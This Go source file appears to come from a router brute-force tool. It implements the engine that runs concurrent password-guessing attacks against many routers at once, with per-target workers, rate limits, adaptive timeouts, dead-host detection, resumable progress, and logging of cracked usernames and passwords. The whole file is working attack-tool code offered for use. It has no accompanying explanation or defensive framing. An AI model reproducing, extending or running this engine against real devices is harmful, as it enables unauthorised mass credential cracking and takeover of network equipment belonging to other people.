package core

import (
	"context"
	"sync"
	"time"

	"github.com/nimda/router-brute/internal/interfaces"
	"github.com/nimda/router-brute/pkg/duallog"
	zlog "github.com/rs/zerolog/log"
)

// MultiTargetResult represents the outcome of attacking a single target
type MultiTargetResult struct {
	Target          *Target
	Results         []Result
	Success         bool
	SuccessPassword string
	Attempts        int
	StartTime       time.Time
	EndTime         time.Time
}

// MultiTargetError represents an error that occurred while processing a target
type MultiTargetError struct {
	Target *Target
	Error  error
}

// MultiTargetEngine handles concurrent attacks on multiple targets
type MultiTargetEngine struct {
	moduleFactory     interfaces.ModuleFactory
	targets           []*Target
	concurrentTargets int
	passwords         []string
	workersPerTarget  int
	rateLimit         time.Duration
	initialTimeout    time.Duration // Initial timeout for each target
	maxTimeout        time.Duration // Maximum timeout (adaptive limit)
	maxConsecErrors   int           // Maximum consecutive errors before marking host dead

	resultsChan     chan MultiTargetResult
	errorsChan      chan MultiTargetError
	wg              sync.WaitGroup
	ctx             context.Context
	progressTracker *ProgressTracker // Optional progress tracking for resume functionality
}

// NewMultiTargetEngine creates a new multi-target engine
func NewMultiTargetEngine(
	moduleFactory interfaces.ModuleFactory,
	workersPerTarget int,
	concurrentTargets int,
	rateLimit time.Duration,
) *MultiTargetEngine {
	return &MultiTargetEngine{
		moduleFactory:     moduleFactory,
		concurrentTargets: concurrentTargets,
		workersPerTarget:  workersPerTarget,
		rateLimit:         rateLimit,
		resultsChan:       make(chan MultiTargetResult, concurrentTargets),
		errorsChan:        make(chan MultiTargetError, concurrentTargets),
	}
}

// LoadTargets loads the targets to attack
func (mte *MultiTargetEngine) LoadTargets(targets []*Target) {
	mte.targets = targets
}

// LoadPasswords loads the passwords to try
func (mte *MultiTargetEngine) LoadPasswords(passwords []string) {
	mte.passwords = passwords
}

// SetProgressTracker sets the progress tracker for resume functionality
func (mte *MultiTargetEngine) SetProgressTracker(tracker *ProgressTracker) {
	mte.progressTracker = tracker
}

// SetTimeouts sets the initial and maximum timeouts
func (mte *MultiTargetEngine) SetTimeouts(initialTimeout, maxTimeout time.Duration) {
	mte.initialTimeout = initialTimeout
	mte.maxTimeout = maxTimeout
}

// SetMaxConsecutiveErrors sets the maximum consecutive errors threshold
func (mte *MultiTargetEngine) SetMaxConsecutiveErrors(max int) {
	mte.maxConsecErrors = max
}

// Start begins the multi-target attack
func (mte *MultiTargetEngine) Start(ctx context.Context) {
	mte.ctx = ctx

	// Progress message goes ONLY to STDERR
	duallog.Progress().
		Str("protocol", mte.moduleFactory.GetProtocolName()).
		Int("targets", len(mte.targets)).
		Int("concurrent_targets", mte.concurrentTargets).
		Int("workers_per_target", mte.workersPerTarget).
		Msg("Starting multi-target attack")

	// Create semaphore for concurrent targets
	semaphore := make(chan struct{}, mte.concurrentTargets)

	for _, target := range mte.targets {
		mte.wg.Add(1)
		go mte.processTarget(target, semaphore)
	}

	// Close channels when all targets are processed
	go func() {
		mte.wg.Wait()
		close(mte.resultsChan)
		close(mte.errorsChan)
		// Progress message goes ONLY to STDERR
		duallog.Progress().Msg("Multi-target attack completed")
	}()
}

// processTarget handles the attack on a single target
func (mte *MultiTargetEngine) processTarget(target *Target, semaphore chan struct{}) {
	defer mte.wg.Done()

	// Acquire semaphore slot
	select {
	case semaphore <- struct{}{}:
		zlog.Debug().Str("target", target.IP).Msg("Acquired semaphore slot")
	case <-mte.ctx.Done():
		zlog.Debug().Str("target", target.IP).Msg("Context cancelled, skipping target")
		return
	}
	defer func() { <-semaphore }()

	startTime := time.Now()
	// Progress message goes ONLY to STDERR
	duallog.Progress().
		Str("target", target.IP).
		Str("username", target.Username).
		Int("port", target.Port).
		Msg("Starting attack on target")

	// Create module for this target
	module := mte.moduleFactory.CreateModule()
	if err := module.Initialize(target.IP, target.Username, map[string]interface{}{
		"port": target.Port,
	}); err != nil {
		zlog.Error().
			Str("target", target.IP).
			Err(err).
			Msg("Failed to initialize module")
		mte.errorsChan <- MultiTargetError{Target: target, Error: err}
		return
	}

	// Pre-flight connection check to fail fast on unreachable targets
	zlog.Debug().Str("target", target.IP).Msg("Testing connection to target...")
	testCtx, testCancel := context.WithTimeout(mte.ctx, 10*time.Second)
	if err := module.Connect(testCtx); err != nil {
		testCancel()
		zlog.Error().
			Str("target", target.IP).
			Int("port", target.Port).
			Err(err).
			Msg("Failed to connect to target")
		mte.errorsChan <- MultiTargetError{Target: target, Error: err}
		return
	}
	testCancel()
	zlog.Info().Str("target", target.IP).Int("port", target.Port).Msg("Connection test successful")

	// Close test connection - workers will reconnect
	if err := module.Close(); err != nil {
		zlog.Debug().Str("target", target.IP).Err(err).Msg("Error closing test connection")
	}

	// Check for existing progress (resume functionality)
	var startPasswordIndex int
	if mte.progressTracker != nil {
		progress := mte.progressTracker.GetTargetProgress(target.IP, target.Port)
		if progress != nil {
			if progress.Completed {
				zlog.Info().
					Str("target", target.IP).
					Int("port", target.Port).
					Bool("success", progress.Success).
					Msg("Target already completed, skipping")
				return
			}
			startPasswordIndex = progress.PasswordsTried
			if startPasswordIndex > 0 {
				// Progress message goes ONLY to STDERR
				duallog.Progress().
					Str("target", target.IP).
					Int("port", target.Port).
					Int("resume_from", startPasswordIndex).
					Msg("Resuming from previous progress")
			}
		}
	}

	// Create engine for this target
	engine := NewEngine(mte.workersPerTarget, mte.rateLimit)
	engine.SetModule(module)

	// Configure error handling and adaptive timeout
	if mte.initialTimeout > 0 {
		engine.SetCurrentTimeout(mte.initialTimeout)
	}
	if mte.maxTimeout > 0 {
		engine.SetMaxTimeout(mte.maxTimeout)
	}
	if mte.maxConsecErrors > 0 {
		engine.SetMaxConsecutiveErrors(mte.maxConsecErrors)
	}

	// Load timeout from resume state if available
	if mte.progressTracker != nil {
		progress := mte.progressTracker.GetTargetProgress(target.IP, target.Port)
		if progress != nil && progress.TimeoutMs > 0 {
			engine.SetCurrentTimeout(time.Duration(progress.TimeoutMs) * time.Millisecond)
			zlog.Debug().
				Str("target", target.IP).
				Int("timeout_ms", progress.TimeoutMs).
				Msg("Loaded timeout from resume state")
		}
	}

	// Create a copy of passwords for this target, skipping already-tried ones
	var passwordsCopy []string
	if startPasswordIndex > 0 && startPasswordIndex < len(mte.passwords) {
		// Resume from where we left off
		passwordsCopy = make([]string, len(mte.passwords)-startPasswordIndex)
		copy(passwordsCopy, mte.passwords[startPasswordIndex:])
		zlog.Debug().
			Str("target", target.IP).
			Int("total_passwords", len(mte.passwords)).
			Int("skipped", startPasswordIndex).
			Int("remaining", len(passwordsCopy)).
			Msg("Password list adjusted for resume")
	} else {
		// Start from beginning
		passwordsCopy = make([]string, len(mte.passwords))
		copy(passwordsCopy, mte.passwords)
	}
	engine.LoadPasswords(passwordsCopy)

	// Run the attack
	engine.StartWithContext(mte.ctx)

	// Collect results while workers are running
	var results []Result
	var successPassword string
	var success bool

	// Use a separate goroutine to collect results while workers run
	resultsDone := make(chan struct{})
	go func() {
		defer close(resultsDone)
		zlog.Debug().Str("target", target.IP).Msg("Collecting results")
		for result := range engine.Results() {
			results = append(results, result)
			if result.Success {
				success = true
				successPassword = result.Password
				// Success message goes to BOTH STDOUT and STDERR
				duallog.Success().
					Str("target", target.IP).
					Str("username", target.Username).
					Str("password", result.Password).
					Dur("time", result.TimeConsumed).
					Msg("✓ Found valid credentials")
			}

			// Update progress tracker periodically (every 10 attempts)
			if mte.progressTracker != nil && len(results)%10 == 0 {
				totalAttempts := startPasswordIndex + len(results)
				mte.progressTracker.UpdateTargetProgress(
					target.IP,
					target.Port,
					totalAttempts,
					false, // not completed yet
					false, // not successful yet
					"",    // no password found yet
					int(engine.GetCurrentTimeout().Milliseconds()), // current timeout
					false,                         // not dead
					engine.GetConsecutiveErrors(), // consecutive errors
				)
			}
		}
		zlog.Debug().Str("target", target.IP).Int("results", len(results)).Msg("Results collected")
	}()

	// Collect errors in a separate goroutine
	errorsDone := make(chan struct{})
	go func() {
		defer close(errorsDone)
		for err := range engine.Errors() {
			zlog.Warn().
				Str("target", target.IP).
				Err(err).
				Msg("Error during attack")
		}
	}()

	// Wait for the engine workers to complete
	zlog.Debug().Str("target", target.IP).Msg("Waiting for engine completion")
	engine.WaitForCompletion()
	zlog.Debug().Str("target", target.IP).Msg("Engine completed")

	// Close the engine - this closes the channels which will unblock the collector goroutines
	zlog.Debug().Str("target", target.IP).Msg("Closing engine")
	engine.Close()
	zlog.Debug().Str("target", target.IP).Msg("Engine closed")

	// Wait for result and error collectors to finish
	<-resultsDone
	<-errorsDone

	endTime := time.Now()
	duration := endTime.Sub(startTime)

	// Update progress tracker with final status
	if mte.progressTracker != nil {
		totalAttempts := startPasswordIndex + len(results)
		maxErrors := mte.maxConsecErrors
		if maxErrors == 0 {
			maxErrors = 5 // Default if not configured
		}
		isDead := engine.GetConsecutiveErrors() >= maxErrors
		mte.progressTracker.UpdateTargetProgress(
			target.IP,
			target.Port,
			totalAttempts,
			true, // completed
			success,
			successPassword,
			int(engine.GetCurrentTimeout().Milliseconds()), // final timeout
			isDead,                        // dead status
			engine.GetConsecutiveErrors(), // final consecutive errors
		)
	}

	mte.resultsChan <- MultiTargetResult{
		Target:          target,
		Results:         results,
		Success:         success,
		SuccessPassword: successPassword,
		Attempts:        len(results),
		StartTime:       startTime,
		EndTime:         endTime,
	}

	// Progress message goes ONLY to STDERR
	duallog.Progress().
		Str("target", target.IP).
		Bool("success", success).
		Int("attempts", len(results)).
		Dur("duration", duration).
		Msg("Completed attack on target")
}

// GetResults returns the channel for receiving results
func (mte *MultiTargetEngine) GetResults() chan MultiTargetResult {
	return mte.resultsChan
}

// GetErrors returns the channel for receiving errors
func (mte *MultiTargetEngine) GetErrors() chan MultiTargetError {
	return mte.errorsChan
}
